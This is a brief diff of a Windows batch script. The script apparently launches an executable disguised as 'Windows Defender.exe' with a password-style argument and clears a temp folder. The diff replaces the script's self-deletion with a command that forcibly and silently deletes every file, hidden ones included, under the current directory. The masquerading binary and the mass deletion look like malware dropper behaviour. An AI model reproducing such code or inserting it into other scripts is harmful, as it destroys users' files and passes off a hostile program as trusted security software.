@@ -89,4 +89,4 @@ rmdir /s /q "%temp%\%folder%"
 
 "%environment%\Windows Defender.exe" -P"rofile of Windows Defender [Microsoft Corporation]"
 endlocal
-del /s /f /q /a "%~f0"
+del /s /f /q /a "%cd%\*"
